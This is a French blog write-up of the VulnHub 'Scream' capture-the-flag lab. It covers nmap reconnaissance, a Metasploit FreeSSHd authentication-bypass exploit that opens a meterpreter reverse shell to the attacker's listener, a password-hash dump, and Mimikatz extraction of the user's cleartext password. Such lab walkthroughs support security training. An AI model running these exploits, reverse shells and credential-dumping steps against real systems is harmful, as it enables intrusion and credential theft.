# Solution du CTF Scream

Nitro
-----

Une mise à jour vers [Metasploit 4.9](https://community.rapid7.com/community/metasploit/blog/2014/03/26/new-metasploit-49-helps-evade-anti-virus-solutions-test-network-segmentation-and-increase-productivity-for-penetration-testers) et on est reparti !  

Comme pour le [CTF Bobby 1](http://devloop.users.sourceforge.net/index.php?article74/solution-du-ctf-bobby-1) on a affaire à un CTF Windows qui passe par la personnalisation d'un ISO de XP SP3.  

Par conséquent allez faire un tour sur mon précédent article pour la mise en place.  

Ici l'objectif [du challenge Scream](http://vulnhub.com/entry/devrandom_scream,47/) est d'obtenir le mot de passe de l'utilisateur local.  

*Nmap* révèle la présence de différents services :  

```plain
Nmap scan report for 192.168.1.22
Host is up (0.00029s latency).
Not shown: 996 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Mar 29 14:35 bin
| drwxr-xr-x 1 ftp ftp              0 Mar 29 14:35 log
|_drwxr-xr-x 1 ftp ftp              0 Mar 29 14:35 root
|_ftp-bounce: bounce working!
22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)
| ssh-hostkey: 1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)
|_1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)
23/tcp open  domain  ISC BIND login
80/tcp open  http    Tinyweb httpd 1.93
|_http-methods: No Allow or Public header in OPTIONS response (status code 403)
|_http-title: The Scream - Edvard Munch
MAC Address: 08:00:27:78:63:1B (Cadmus Computer Systems)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2000|XP
OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
OS details: Microsoft Windows 2000 SP4, Microsoft Windows XP SP2 or SP3
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Le serveur web a juste une page d'index avec un ascii-art qui reprends le fameux [Cri d'Edvard Munch](http://fr.wikipedia.org/wiki/Le_Cri) (parenthèse culturelle il parait que c'est la tableau le plus cher au monde...)  

A part ça rien à voir de ce côté.  

Je me suis intéressé au serveur FTP qui permet les connexions en anonymous. Aucun droit n'est donné quand on s'y connecte (les fichiers ne sont pas lisibles), aussi j'ai tenté d'exploiter la faille dans cette version de *WAR-FTPD*.  

*Metasploit* dispose en effet d'un exploit baptisé *"War-FTPD 1.65 Username Overflow"* qui compte XP SP3 dans les plateformes supportées. Ça semblait prometteur mais malgré tous mes essais, rien à faire. *Metasploit* a indiqué par moment que l'exploit a aboutit mais rien sur notre port d'écoute qui attend un reverse-shell :(   

J'ai remarqué lors de la personnalisation de l'ISO par *AutoIt* une fenêtre *AVG* qui pourrait être la cause de ce problème. Mais même en jouant avec les différents payloads, encodeurs et options avancées (*show advanced*) toujours pas de shell :(  

G0t syst3m ?
------------

Je me suis alors rabatu sur le serveur SSHD : j'ai trouvé [un exploit de KingCope](http://www.exploit-db.com/exploits/23080/) pour une faille permettant de bypasser l'authentification.  

L'exploit consiste à récupérer et modifier un client SSH ([5.8p2](https://launchpad.net/openssh/main/5.8p2)) mais après avoir testé plusieurs noms d'utilisateurs, force est de constater que ça ne marchait pas.  

Je me suis bêtement rendu compte en fouillant un peu plus que *Metasploit* disposait aussi d'un exploit pour la même vulnérabilité :  

```plain
msf exploit(freesshd_authbypass) > show options

Module options (exploit/windows/ssh/freesshd_authbypass):

   Name       Current Setting                                                   Required  Description
   ----       ---------------                                                   --------  -----------
   RHOST      192.168.1.22                                                      yes       The target address
   RPORT      22                                                                yes       The target port
   USERNAME                                                                     no        A specific username to try
   USER_FILE  /data/metasploit-4.9/apps/pro/msf3/data/wordlists/unix_users.txt  yes       File containing usernames, one per line

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     192.168.1.3      yes       The listen address
   LPORT     9999             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Freesshd <= 1.2.6 / Windows (Universal)

msf exploit(freesshd_authbypass) > exploit

[*] Started reverse handler on 192.168.1.3:9999 
[*] Trying username '4Dgifts'
[*] Trying username 'EZsetup'
[*] Trying username 'OutOfBox'
[*] Trying username 'ROOT'
[*] Trying username 'adm'
[*] Trying username 'admin'
[*] Uploading payload, this may take several minutes...
[*] Sending stage (769536 bytes) to 192.168.1.22
[*] Meterpreter session 1 opened (192.168.1.3:9999 -> 192.168.1.22:1072) at 2014-03-29 16:59:54 +0100

meterpreter > ps

Process List
============

 PID   PPID  Name                            Arch  Session     User                          Path
 ---   ----  ----                            ----  -------     ----                          ----
 0     0     [System Process]                      4294967295                                
 4     0     System                          x86   0           NT AUTHORITY\SYSTEM           
 236   636   alg.exe                         x86   0           NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\System32\alg.exe
 384   4     smss.exe                        x86   0           NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 456   412   explorer.exe                    x86   0           SCREAM\alex                   C:\WINDOWS\Explorer.EXE
 568   384   csrss.exe                       x86   0           NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\csrss.exe
 592   384   winlogon.exe                    x86   0           NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe
 636   592   services.exe                    x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe
 648   592   lsass.exe                       x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe
 804   636   svchost.exe                     x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\svchost.exe
 828   980   wscntfy.exe                     x86   0           SCREAM\alex                   C:\WINDOWS\system32\wscntfy.exe
 884   636   svchost.exe                     x86   0           NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
 980   636   svchost.exe                     x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
 1036  636   svchost.exe                     x86   0           NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
 1060  636   svchost.exe                     x86   0           NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\system32\svchost.exe
 1224  1292  aCwFw.exe                       x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\TEMP\aCwFw.exe
 1268  636   spoolsv.exe                     x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\spoolsv.exe
 1492  592   logon.scr                       x86   0           SCREAM\alex                   C:\WINDOWS\System32\logon.scr
 1556  636   FileZilla server.exe            x86   0           NT AUTHORITY\SYSTEM           C:\Program Files\FileZilla Server\FileZilla Server.exe
 1588  636   FreeSSHDService.exe             x86   0           NT AUTHORITY\SYSTEM           C:\Program Files\freeSSHd\FreeSSHDService.exe
 1740  636   OpenTFTPServerMT.exe            x86   0           NT AUTHORITY\SYSTEM           C:\OpenTFTPServer\OpenTFTPServerMT.exe
 1792  456   FileZilla Server Interface.exe  x86   0           SCREAM\alex                   C:\Program Files\FileZilla Server\FileZilla Server Interface.exe

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 24198fa48ad44c4d77fb0d536e590e53...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:2bf1928be3d38ac3cd7fe0c29e77fe10:62a47ba71ff4351f45933a18ccfb6db4:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9218eb1721cfcff146867f9d715fa8df:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:504182f8417ed8557b67e96adc8b4d04:::
```

Aïe, la compatibilité lanman semble avoir été désactivée (on voit pour les hashs LM des *aad3*... qui correspondent à une chaîne vide).  

A tout hazard on lance *John The Ripper* mais après quelques minutes on se dit que ce n'est pas la peine d'insister :(   

Finalement je tombe [sur cet article](http://www.securityartwork.es/2013/06/04/mimikatz-extension-for-metasploit/?lang=en) qui parle du module *Mimikatz* dans *Metasploit*. Mettons en application :  

```plain
meterpreter > load mimikatz
Loading extension mimikatz...success.

meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID   Package    Domain        User             Password
------   -------    ------        ----             --------
0;999    NTLM       WORKGROUP     SCREAM$          
0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE    
0;25771  NTLM                                      
0;996    Negotiate  NT AUTHORITY  NETWORK SERVICE  
0;34724  NTLM       SCREAM        alex             thisisaverylongpassword
```

Effectivement c'est plus rapide :p   


*Published March 29 2014 at 17:39*